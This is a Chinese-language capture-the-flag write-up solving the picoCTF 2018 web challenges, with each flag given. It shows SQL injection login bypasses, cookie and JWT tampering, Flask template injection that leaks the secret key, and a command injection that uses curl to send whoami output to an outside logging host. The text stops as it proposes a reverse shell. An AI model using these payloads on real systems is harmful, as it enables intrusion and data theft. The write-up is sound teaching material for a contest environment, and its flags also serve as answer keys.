<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="2802fc6ac55e02587e69c0f31a5e09cf">前言</h1>
<p>这是一个由卡耐基梅隆大学主办的CTF比赛，整体难度偏简单，适合新手入门。但是……这个比赛的主要面向人群是初中生和高中生，本菜鸡实在是自愧不如orz，还是直接看题吧=-=。</p>
<h1 data-content="1" id="dc8f1fa140de5348fbd59d12d9376ad3">Inspect Me</h1>
<h2 data-content="1" id="6d915513d08532396e193113bacaca38">Question</h2>
<blockquote>
<p>Inpect this code! <a href="http://2018shell1.picoctf.com:53213/" target="_blank">http://2018shell1.picoctf.com:53213</a> (<a href="http://2018shell1.picoctf.com:53213/" target="_blank">link</a>)</p>
</blockquote>
<h3 data-content="1" id="ea1cee27d392d738b11fa82301458f6a">Hint</h3>
<blockquote>
<p>How do you inspect a website's code on a browser?</p>
<p>Check all the website code.</p>
</blockquote>
<h2 data-content="1" id="683c5ad08a2343e7647cc8cc4e055cc6">Solution</h2>
<p>基础入门，查看源代码即可。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181017175301-6f76a822-d1f2-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181017175315-7781cb50-d1f2-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181017175322-7baa3a14-d1f2-1.png"/></p>
<p>flag:<code>picoCTF{ur_4_real_1nspect0r_g4dget_098df0d0}</code></p>
<h1 data-content="1" id="bbe2e6f527c49775efe3adbb0d109848">Client Side is Still Bad</h1>
<h2 data-content="1" id="6378092cf8958c7b850d9047420a709a">Question</h2>
<blockquote>
<p>I forgot my password again, but this time there doesn't seem to be a reset, can you help me? (<a href="http://2018shell1.picoctf.com:55790/" target="_blank">link</a>)</p>
</blockquote>
<h3 data-content="1" id="f97a4438f93040c4c62d6e063418fe3f">Hint</h3>
<blockquote>
<p>Client Side really is a bad way to do it.</p>
</blockquote>
<h2 data-content="1" id="97f3aeb68cc9c9441ee2101c7e71bc60">Solution</h2>
<p>本地js验证登录，把每一个小段的字符串拼接起来就是flag。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181017175333-824c4ec0-d1f2-1.png"/></p>
<p>flag:<code>picoCTF{client_is_bad_3bd366}</code></p>
<h1 data-content="1" id="0f404823acd44daae88800a2ee5accaf">Logon</h1>
<h2 data-content="1" id="3bb55cc902a6871307bf0c75d1f08687">Question</h2>
<blockquote>
<p>I made a website so now you can log on to! I don't seem to have the admin password. See if you can't get to the flag. (<a href="http://2018shell1.picoctf.com:37861/" target="_blank">link</a>)</p>
</blockquote>
<h3 data-content="1" id="a5f22b08f9785d7ae6d548112ab76233">Hint</h3>
<blockquote>
<p>Hmm it doesn't seem to check anyone's password, except for admins?</p>
<p>How does check the admin's password?</p>
</blockquote>
<h2 data-content="1" id="45e3433aa273f3203f8f911b585781aa">Solution</h2>
<p>随便构造一个除了<code>admin</code>之外的用户名登录，会重定向至/flag，且返回头有Set-Cookie。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181017175344-88e71b52-d1f2-1.png"/></p>
<p>在cookie中将<code>admin</code>设为True。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181017175355-8fb6b0d2-d1f2-1.png"/></p>
<p>再访问/flag，得到flag。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181017175405-95864acc-d1f2-1.png"/></p>
<p>flag:<code>picoCTF{l0g1ns_ar3nt_r34l_a280e12c}</code></p>
<h1 data-content="1" id="de65b346b87e1b227c53c4c8a2e93eeb">Irish Name Repo</h1>
<h2 data-content="1" id="face6b5efefbb25fc2a26388cddbe4d0">Question</h2>
<blockquote>
<p>There is a website running at <a href="http://2018shell1.picoctf.com:59464/" target="_blank">http://2018shell1.picoctf.com:59464</a> (<a href="http://2018shell1.picoctf.com:59464/" target="_blank">link</a>) . Do you think you can log us in? Try to see if you can login!</p>
</blockquote>
<h3 data-content="1" id="f06921f2a051b0063ae2ee4adce3bf96">Hint</h3>
<blockquote>
<p>There doesn't seem to be many ways to interact with this, I wonder if the users are kept in a database?</p>
</blockquote>
<h2 data-content="1" id="66752a21e8a305518756ae8c3be3f19f">Solution</h2>
<p>没有任何过滤的注入，直接到/admin登录页面，使用万能密码<code>admin' or '1'='1</code>登录即可</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181017175420-9e7efafc-d1f2-1.png"/></p>
<p>flag:<code>picoCTF{con4n_r3411y_1snt_1r1sh_d121ca0b}</code></p>
<h1 data-content="1" id="89c99d66020b1a9cc858f2c148f49054">Mr. Robots</h1>
<h2 data-content="1" id="0f1da4243f22b7c888488d757afd1f28">Question</h2>
<blockquote>
<p>Do you see the same things I see? The glimpses of the flag hidden away? (<a href="http://2018shell1.picoctf.com:10157/" target="_blank">link</a>)</p>
</blockquote>
<h3 data-content="1" id="afc544d3e84af851e249a3ba22061be1">Hint</h3>
<blockquote>
<p>What part of the website could tell you where the creator doesn't want you to look?</p>
</blockquote>
<h2 data-content="1" id="187bdb4320f7973439919bc9202274c5">Solution</h2>
<p>访问/robots.txt，返回</p>
<div class="highlight"><pre><span></span>User-agent: *
Disallow: /143ce.html
</pre></div>
<p>再访问/143ce.html</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181017175433-a6173e82-d1f2-1.png"/></p>
<p>flag:<code>picoCTF{th3_w0rld_1s_4_danger0us_pl4c3_3lli0t_143ce}</code></p>
<h1 data-content="1" id="765e7404da2572a1edcdab391eaa90ba">No Login</h1>
<h2 data-content="1" id="a61524418a490ef8018e08918145fd9b">Question</h2>
<blockquote>
<p>Looks like someone started making a website but never got around to making a login, but I heard there was a flag if you were the admin. <a href="http://2018shell1.picoctf.com:33889/" target="_blank">http://2018shell1.picoctf.com:33889</a> (<a href="http://2018shell1.picoctf.com:33889/" target="_blank">link</a>)</p>
</blockquote>
<h3 data-content="1" id="48765baa3dbe1c931a30761d239aede9">Hint</h3>
<blockquote>
<p>What is it actually looking for in the cookie?</p>
</blockquote>
<h2 data-content="1" id="5925efb4bf6fc1e190e58c1185cd878c">Solution</h2>
<p>session里有jwt。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181017175446-adf5d096-d1f2-1.png"/></p>
<p>解码一下。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181017175455-b30bf236-d1f2-1.png"/></p>
<p>和前面那题一样cookie加入<code>admin=1</code>即可。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181017175510-bc83a6d8-d1f2-1.png"/></p>
<p>flag:<code>picoCTF{n0l0g0n_n0_pr0bl3m_26b0181a}</code></p>
<h1 data-content="1" id="d74a2147ffa3cea182944116bd6d99bd">Secret Agent</h1>
<h2 data-content="1" id="86dd103b14693e4fb8ff8d74e3ff6d29">Question</h2>
<blockquote>
<p>Here's a little website that hasn't fully been finished. But I heard google gets all your info anyway. <a href="http://2018shell1.picoctf.com:53383/" target="_blank">http://2018shell1.picoctf.com:53383</a> (<a href="http://2018shell1.picoctf.com:53383/" target="_blank">link</a>)</p>
</blockquote>
<h3 data-content="1" id="8250a04fbbd4d6b02658492b37ca6fb7">Hint</h3>
<blockquote>
<p>How can your browser pretend to be something else?</p>
</blockquote>
<h2 data-content="1" id="34b4aaa8df532d7329a1a010c100d1ee">Solution</h2>
<p>访问页面显示<code>You're not google! Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36</code>。需要伪造UA，一开始以为是改chrome，一寻思不对啊，我用的不就是chrome吗= =……。后来再琢磨了一下，<code>You're not google</code>不是<code>You're not chrome</code>，所以应该是伪造成Google爬虫。</p>
<div class="highlight"><pre><span></span>~
❯ curl -s http://2018shell1.picoctf.com:53383/flag --user-agent <span class="s2">"googlebot"</span> <span class="p">|</span>grep pico
            &lt;p <span class="nv">style</span><span class="o">=</span><span class="s2">"text-align:center; font-size:30px;"</span>&gt;&lt;b&gt;Flag&lt;/b&gt;: &lt;code&gt;picoCTF<span class="o">{</span>s3cr3t_ag3nt_m4n_134ecd62<span class="o">}</span>&lt;/code&gt;&lt;/p&gt;
</pre></div>
<p>flag:<code>picoCTF{s3cr3t_ag3nt_m4n_134ecd62}</code></p>
<h1 data-content="1" id="e681810087207160026a0ff9fe1eb6dd">Buttons</h1>
<h2 data-content="1" id="0c4cbf2706a2e726b4d573adac99d8a4">Question</h2>
<blockquote>
<p>There is a website running at <a href="http://2018shell1.picoctf.com:21579/" target="_blank">http://2018shell1.picoctf.com:21579</a> (<a href="http://2018shell1.picoctf.com:21579/" target="_blank">link</a>). Try to see if you can push their buttons.</p>
</blockquote>
<h3 data-content="1" id="3c73f6ffef66cec9473fde158bc36657">Hint</h3>
<blockquote>
<p>What's different about the two buttons?</p>
</blockquote>
<h2 data-content="1" id="f1ca85762a1c5c4eec75e6521a9db5d9">Solution</h2>
<p>两个按钮，第一个会触发<code>POST</code>发送表单，而第二个则会触发一个<code>GET</code>请求。</p>
<div class="highlight"><pre><span></span>...
<span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">"button1.php"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"PUSH ME! I am your only hope!"</span><span class="p">/&gt;</span>
<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
...
</pre></div>
<div class="highlight"><pre><span></span>...
You did it! Try the next button: <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"button2.php"</span><span class="p">&gt;</span>Button2<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
...
</pre></div>
<p>通过POST访问第二个页面就可以了。</p>
<div class="highlight"><pre><span></span>~
❯ curl -X POST 2018shell1.picoctf.com:21579/button2.php
Well <span class="k">done</span>, your flag is: picoCTF<span class="o">{</span>button_button_whose_got_the_button_ed306c10<span class="o">}</span>%
</pre></div>
<p>flag:<code>picoCTF{button_button_whose_got_the_button_ed306c10}</code></p>
<h1 data-content="1" id="d3ee7f783c02692181f0bb55a70b154f">The Vault</h1>
<h2 data-content="1" id="438d7845db31c07765d6f5f6b57f1553">Question</h2>
<blockquote>
<p>There is a website running at <a href="http://2018shell1.picoctf.com:56537/" target="_blank">http://2018shell1.picoctf.com:56537</a> (<a href="http://2018shell1.picoctf.com:56537/" target="_blank">link</a>). Try to see if you can login!</p>
</blockquote>
<h3 data-content="1" id="b20fc6587492f4464b7c45c888761f8d">Hint</h3>
<p>No Hints.</p>
<h2 data-content="1" id="83b9f05810f2006eab6be486d9c52d1b">Solution</h2>
<p>题目给了源码</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
  <span class="nb">ini_set</span><span class="p">(</span><span class="s1">'error_reporting'</span><span class="p">,</span> <span class="k">E_ALL</span><span class="p">);</span>
  <span class="nb">ini_set</span><span class="p">(</span><span class="s1">'display_errors'</span><span class="p">,</span> <span class="s1">'On'</span><span class="p">);</span>

  <span class="k">include</span> <span class="s2">"config.php"</span><span class="p">;</span>
  <span class="nv">$con</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SQLite3</span><span class="p">(</span><span class="nv">$database_file</span><span class="p">);</span>

  <span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">"username"</span><span class="p">];</span>
  <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">"password"</span><span class="p">];</span>
  <span class="nv">$debug</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">"debug"</span><span class="p">];</span>
  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT 1 FROM users WHERE name='</span><span class="si">$username</span><span class="s2">' AND password='</span><span class="si">$password</span><span class="s2">'"</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="nb">intval</span><span class="p">(</span><span class="nv">$debug</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"&lt;pre&gt;"</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">"username: "</span><span class="p">,</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$username</span><span class="p">),</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">"password: "</span><span class="p">,</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$password</span><span class="p">),</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">"SQL query: "</span><span class="p">,</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$query</span><span class="p">),</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">"&lt;/pre&gt;"</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="c1">//validation check</span>
  <span class="nv">$pattern</span> <span class="o">=</span><span class="s2">"/.*['</span><span class="se">\"</span><span class="s2">].*OR.*/i"</span><span class="p">;</span>
  <span class="nv">$user_match</span> <span class="o">=</span> <span class="nb">preg_match</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span> <span class="nv">$username</span><span class="p">);</span>
  <span class="nv">$password_match</span> <span class="o">=</span> <span class="nb">preg_match</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span> <span class="nv">$username</span><span class="p">);</span>
  <span class="k">if</span><span class="p">(</span><span class="nv">$user_match</span> <span class="o">+</span> <span class="nv">$password_match</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>  <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"&lt;h1&gt;SQLi detected.&lt;/h1&gt;"</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$con</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
    <span class="nv">$row</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="na">fetchArray</span><span class="p">();</span>

    <span class="k">if</span> <span class="p">(</span><span class="nv">$row</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">echo</span> <span class="s2">"&lt;h1&gt;Logged in!&lt;/h1&gt;"</span><span class="p">;</span>
      <span class="k">echo</span> <span class="s2">"&lt;p&gt;Your flag is: </span><span class="si">$FLAG</span><span class="s2">&lt;/p&gt;"</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="k">echo</span> <span class="s2">"&lt;h1&gt;Login failed.&lt;/h1&gt;"</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>

<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>可以看到过滤了关键词<code>OR</code>，其他都和Irish Name Repo类似，改用<code>like</code>注入。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181017175817-2bd1c9e8-d1f3-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181017175903-4766142a-d1f3-1.png"/></p>
<p>flag:<code>picoCTF{w3lc0m3_t0_th3_vau1t_c09f30a0}</code></p>
<h1 data-content="1" id="649f245245c86db005beb2c3770268f2">Artisinal Handcrafted HTTP 3</h1>
<h2 data-content="1" id="a08151171d1204286dd245cea0caf5a4">Question</h2>
<blockquote>
<p>We found a hidden flag server hiding behind a proxy, but the proxy has some... <em>interesting</em> ideas of what qualifies someone to make HTTP requests. Looks like you'll have to do this one by hand. Try connecting via <code>nc 2018shell1.picoctf.com 42496</code>, and use the proxy to send HTTP requests to <code>flag.local</code>. We've also recovered a username and a password for you to use on the login page: <code>realbusinessuser</code>/<code>potoooooooo</code>.</p>
</blockquote>
<h3 data-content="1" id="8a092e86ac5078e78f0aff502f73633a">Hint</h3>
<blockquote>
<p><em>Be the browser.</em> When you navigate to a page, how does your browser send HTTP requests? How does this change when you submit a form?</p>
</blockquote>
<h2 data-content="1" id="7ee2b6cd367cf77d598b279fbd7f3321">Solution</h2>
<p>大概意思就是要向名为<code>flag.local</code>的主机，手动构造并发送<code>HTTP</code>请求。先请求<code>/</code>试试。</p>
<div class="highlight"><pre><span></span><span class="c1"># 请求</span>
GET / HTTP/1.1
Host: flag.local
<span class="c1"># 返回</span>
HTTP/1.1 <span class="m">200</span> OK
x-powered-by: Express
content-type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
content-length: <span class="m">321</span>
etag: W/<span class="s2">"141-LuTf9ny9p1l454tuA3Un+gDFLWo"</span>
date: Mon, <span class="m">15</span> Oct <span class="m">2018</span> <span class="m">17</span>:04:13 GMT
connection: close


        &lt;html&gt;
            &lt;head&gt;
                &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">type</span><span class="o">=</span><span class="s2">"text/css"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"main.css"</span> /&gt;
            &lt;/head&gt;
            &lt;body&gt;
                &lt;header&gt;
                    &lt;h1&gt;Real Business Internal Flag Server&lt;/h1&gt;
                    &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"/login"</span>&gt;Login&lt;/a&gt;
                &lt;/header&gt;
                &lt;main&gt;
                    &lt;p&gt;You need to log in before you can see today<span class="err">'</span>s flag.&lt;/p&gt;
                &lt;/main&gt;
            &lt;/body&gt;
        &lt;/html&gt;
        %
</pre></div>
<p>跟进请求<code>/login</code>。</p>
<div class="highlight"><pre><span></span><span class="c1"># 请求</span>
GET /login HTTP/1.1
HOST:flag.local
<span class="c1"># 返回</span>
HTTP/1.1 <span class="m">200</span> OK
x-powered-by: Express
content-type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
content-length: <span class="m">498</span>
etag: W/<span class="s2">"1f2-UE5AGAqbLVQn1qrfKFRIqanxl9I"</span>
date: Mon, <span class="m">15</span> Oct <span class="m">2018</span> <span class="m">17</span>:06:06 GMT
connection: close


        &lt;html&gt;
            &lt;head&gt;
                &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">type</span><span class="o">=</span><span class="s2">"text/css"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"main.css"</span> /&gt;
            &lt;/head&gt;
            &lt;body&gt;
                &lt;header&gt;
                    &lt;h1&gt;Real Business Internal Flag Server&lt;/h1&gt;
                    &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"/login"</span>&gt;Login&lt;/a&gt;
                &lt;/header&gt;
                &lt;main&gt;
                    &lt;h2&gt;Log In&lt;/h2&gt;

                    &lt;form <span class="nv">method</span><span class="o">=</span><span class="s2">"POST"</span> <span class="nv">action</span><span class="o">=</span><span class="s2">"login"</span>&gt;
                        &lt;input <span class="nv">type</span><span class="o">=</span><span class="s2">"text"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"user"</span> <span class="nv">placeholder</span><span class="o">=</span><span class="s2">"Username"</span> /&gt;
                        &lt;input <span class="nv">type</span><span class="o">=</span><span class="s2">"password"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"pass"</span> <span class="nv">placeholder</span><span class="o">=</span><span class="s2">"Password"</span> /&gt;
                        &lt;input <span class="nv">type</span><span class="o">=</span><span class="s2">"submit"</span> /&gt;
                    &lt;/form&gt;
                &lt;/main&gt;
            &lt;/body&gt;
        &lt;/html&gt;
        %
</pre></div>
<p>然后<code>POST</code>发送题目给的用户名和密码。</p>
<div class="highlight"><pre><span></span><span class="c1"># 请求</span>
POST /login HTTP/1.1
Host: flag.local
Content-Type: application/x-www-form-urlencoded
Content-Length: <span class="m">38</span>

<span class="nv">user</span><span class="o">=</span>realbusinessuser<span class="p">&amp;</span><span class="nv">pass</span><span class="o">=</span>potoooooooo
<span class="c1"># 返回</span>
HTTP/1.1 <span class="m">302</span> Found
x-powered-by: Express
set-cookie: <span class="nv">real_business_token</span><span class="o">=</span>PHNjcmlwdD5hbGVydCgid2F0Iik8L3NjcmlwdD4%3D<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/
location: /
vary: Accept
content-type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
content-length: <span class="m">23</span>
date: Mon, <span class="m">15</span> Oct <span class="m">2018</span> <span class="m">17</span>:08:18 GMT
connection: close

Found. Redirecting to /%
</pre></div>
<p>返回一个302，并且带有一个<code>cookie</code>，用这个<code>cookie</code>再访问一次<code>/</code>，得到flag。</p>
<div class="highlight"><pre><span></span><span class="c1"># 请求</span>
GET / HTTP/1.1
HOST:flag.local
cookie:real_business_token<span class="o">=</span>PHNjcmlwdD5hbGVydCgid2F0Iik8L3NjcmlwdD4%3D<span class="p">;</span>
<span class="c1"># 返回</span>
HTTP/1.1 <span class="m">200</span> OK
x-powered-by: Express
content-type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
content-length: <span class="m">438</span>
etag: W/<span class="s2">"1b6-eYJ8DUTdkgByyfWFi6OJJSjopFg"</span>
date: Mon, <span class="m">15</span> Oct <span class="m">2018</span> <span class="m">17</span>:10:13 GMT
connection: close


        &lt;html&gt;
            &lt;head&gt;
                &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="nv">type</span><span class="o">=</span><span class="s2">"text/css"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"main.css"</span> /&gt;
            &lt;/head&gt;
            &lt;body&gt;
                &lt;header&gt;
                    &lt;h1&gt;Real Business Internal Flag Server&lt;/h1&gt;
                    &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"user"</span>&gt;Real Business Employee&lt;/div&gt;
                    &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"/logout"</span>&gt;Logout&lt;/a&gt;
                &lt;/header&gt;
                &lt;main&gt;
                    &lt;p&gt;Hello &lt;b&gt;Real Business Employee&lt;/b&gt;!  Today<span class="err">'</span>s flag is: &lt;code&gt;picoCTF<span class="o">{</span>0nLY_Us3_n0N_GmO_xF3r_pR0tOcol5_2e14<span class="o">}</span>&lt;/code&gt;.&lt;/p&gt;
                &lt;/main&gt;
            &lt;/body&gt;
        &lt;/html&gt;
        %
</pre></div>
<p>flag:<code>picoCTF{0nLY_Us3_n0N_GmO_xF3r_pR0tOcol5_2e14}</code></p>
<h1 data-content="1" id="8f9cb7ffa1ca2293db31f2162d662f56">Flaskcards</h1>
<h2 data-content="1" id="72bde2b11e80f796ef3d78330c78bd7f">Question</h2>
<blockquote>
<p>We found this fishy <a href="http://2018shell1.picoctf.com:23547/" target="_blank">website</a> for flashcards that we think may be sending secrets. Could you take a look?</p>
</blockquote>
<h3 data-content="1" id="00544a76a677573d6ac20237d4bcbb5d">Hint</h3>
<blockquote>
<p>Are there any common vulnerabilities with the backend of the website?</p>
<p>Is there anywhere that filtering doesn't get applied?</p>
<p>The database gets reverted every 2 hours so your session might end unexpectedly. Just make another user</p>
</blockquote>
<h2 data-content="1" id="f0bbabe92ba26d3b08c7b99538b31711">Solution</h2>
<p>从题目名字推测网站用的应该是flask框架，根据hint来看应该是SSTI漏洞。</p>
<p>访问<a href="http://2018shell1.picoctf.com:23547/{{" target="_blank">http://2018shell1.picoctf.com:23547/{{</a> 1+1 }}，并没有返回特殊的数据，说明网站错误机制应该没有问题，切入点不在这。注册账号并登陆，发现多了<code>Creating cards</code>、<code>Listing cards</code>。</p>
<p>在<code>Creating cards</code>的Question和answer处输入<em>{{1+1}}</em>，然后切换到<code>Listing Cards</code>，发现两处都变成了2而不是1。</p>
<p>读取<em>{{ config.items() }}</em>，发现<code>secretkey</code>就是flag。</p>
<pre><code>dict_items([('DEBUG', False), ('PREFERRED_URL_SCHEME', 'http'), ('SQLALCHEMY_POOL_TIMEOUT', None), ('JSON_AS_ASCII', True),
('PROPAGATE_EXCEPTIONS', None), ('ENV', 'production'), ('SQLALCHEMY_POOL_RECYCLE', None), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(31)),
('JSON_SORT_KEYS', True), ('SQLALCHEMY_TRACK_MODIFICATIONS', False), ('SERVER_NAME', None), ('TRAP_BAD_REQUEST_ERRORS', None),
('MAX_COOKIE_SIZE', 4093), ('USE_X_SENDFILE', False), ('EXPLAIN_TEMPLATE_LOADING', False), ('BOOTSTRAP_LOCAL_SUBDOMAIN', None),
('APPLICATION_ROOT', '/'), ('BOOTSTRAP_USE_MINIFIED', True), ('MAX_CONTENT_LENGTH', None), ('BOOTSTRAP_QUERYSTRING_REVVING', True),
('TRAP_HTTP_EXCEPTIONS', False), ('SESSION_COOKIE_PATH', None), ('TESTING', False), ('SQLALCHEMY_COMMIT_ON_TEARDOWN', False),
('PRESERVE_CONTEXT_ON_EXCEPTION', None), ('SQLALCHEMY_POOL_SIZE', None), ('SESSION_COOKIE_HTTPONLY', True), ('SESSION_COOKIE_NAME', 'session'),
('SESSION_COOKIE_SECURE', False), ('JSONIFY_PRETTYPRINT_REGULAR', False), ('TEMPLATES_AUTO_RELOAD', None), ('SESSION_COOKIE_SAMESITE', None),
('JSONIFY_MIMETYPE', 'application/json'), ('SQLALCHEMY_RECORD_QUERIES', None), ('SESSION_COOKIE_DOMAIN', False), ('SEND_FILE_MAX_AGE_DEFAULT', datetime.timedelta(0, 43200)),
('SQLALCHEMY_NATIVE_UNICODE', None), ('SQLALCHEMY_BINDS', None), ('SQLALCHEMY_DATABASE_URI', 'sqlite://'), ('SQLALCHEMY_ECHO', False),
('BOOTSTRAP_SERVE_LOCAL', False), ('BOOTSTRAP_CDN_FORCE_SSL', False),
('SECRET_KEY', 'picoCTF{secret_keys_to_the_kingdom_584f8327}'),
('SESSION_REFRESH_EACH_REQUEST', True), ('SQLALCHEMY_MAX_OVERFLOW', None)])</code></pre>
<p>flag:<code>picoCTF{secret_keys_to_the_kingdom_584f8327}</code></p>
<h1 data-content="1" id="fef106f272c1cd00daccdcf738d438dd">fancy-alive-monitoring</h1>
<h2 data-content="1" id="a588d52cec28f87e5462a9c6699faf54">Question</h2>
<blockquote>
<p>One of my school mate developed an alive monitoring tool. Can you get a flag from <a href="http://2018shell1.picoctf.com:31070/" target="_blank">http://2018shell1.picoctf.com:31070</a>(<a href="http://2018shell1.picoctf.com:31070/" target="_blank">link</a>)?</p>
</blockquote>
<h3 data-content="1" id="df0d2b8468f02c2f67669131742dfde4">Hint</h3>
<blockquote>
<p>This application uses the validation check both on the client side and on the server side, but the server check seems to be inappropriate.</p>
<p>You should be able to listen through the shell on the server.</p>
</blockquote>
<h2 data-content="1" id="6f8014071e3790d007cbb91cfaa5a57f">Solution</h2>
<p>查看源码，输入处有js检查，表单处有正则检查。</p>
<pre><code>&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Monitoring Tool&lt;/title&gt;
    &lt;script&gt;
    function check(){
        ip = document.getElementById("ip").value;
        chk = ip.match(/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/);
        if (!chk) {
            alert("Wrong IP format.");
            return false;
        } else {
            document.getElementById("monitor").submit();
        }
    }
    &lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h1&gt;Monitoring Tool ver 0.1&lt;/h1&gt;
    &lt;form id="monitor" action="index.php" method="post" onsubmit="return false;"&gt;
    &lt;p&gt; Input IP address of the target host
    &lt;input id="ip" name="ip" type="text"&gt;
    &lt;/p&gt;
    &lt;input type="button" value="Go!" onclick="check()"&gt;
    &lt;/form&gt;
    &lt;hr&gt;

&lt;?php
$ip = $_POST["ip"];
if ($ip) {
    // super fancy regex check!
    if (preg_match('/^(([1-9]?[0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5]).){3}([1-9]?[0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])/',$ip)) {
        exec('ping -c 1 '.$ip, $cmd_result);
        foreach($cmd_result as $str){
            if (strpos($str, '100% packet loss') !== false){
                printf("&lt;h3&gt;Target is NOT alive.&lt;/h3&gt;");
                break;
            } else if (strpos($str, ', 0% packet loss') !== false){
                printf("&lt;h3&gt;Target is alive.&lt;/h3&gt;");
                break;
            }
        }
    } else {
        echo "Wrong IP Format.";
    }
}
?&gt;
&lt;hr&gt;
&lt;a href="index.txt"&gt;index.php source code&lt;/a&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
<p>js检查可以直接忽略，关键看正则过滤。</p>
<div class="highlight"><pre><span></span><span class="x">...</span>
<span class="x">if ($ip) {</span>
<span class="x">    // super fancy regex check!</span>
<span class="x">    if (preg_match('/^(([1-9]?[0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5]).){3}([1-9]?[0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])/',$ip)) </span>
<span class="x">...</span>
</pre></div>
<p>正则结尾没有写<code>$</code>，所以ip后面可以插入任意字符。页面没有命令回显，就可以用DNSlog查看命令执行返回的信息。</p>
<p>输入 <code>ip=0.0.0.0;curl http://40zqma.ceye.io/`whoami`</code> 发现可以收到回显。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181017175950-63292d3c-d1f3-1.png"/></p>
<p>也可以直接反弹shell，更方便。使用python来反弹shell。</p>
